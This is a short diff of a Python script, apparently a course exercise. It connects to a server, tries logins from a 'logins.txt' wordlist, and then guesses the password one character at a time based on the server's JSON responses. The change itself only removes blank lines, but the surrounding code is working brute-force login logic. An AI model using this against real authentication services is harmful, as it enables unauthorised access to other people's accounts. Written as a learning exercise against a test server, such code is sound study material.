@@ -55,7 +55,6 @@ with open(r'.\hacking\logins.txt', 'r') as file:
 host_name, port = sys.argv[1:]
 with socket.socket() as client_socket:
     client_socket.connect((host_name, int(port)))
-
     wrong_login = json.dumps({"result": "Wrong login!"})
     wrong_password = json.dumps({"result": "Wrong password!"})
     exception_happened = json.dumps({"result": "Exception happened during login"})
@@ -69,7 +68,6 @@ with socket.socket() as client_socket:
         if response != wrong_login:
             login = word.rstrip()
             break
-
     while True:
         for letter in letters:
             json_send = json.dumps({"login": login, "password": password + letter})
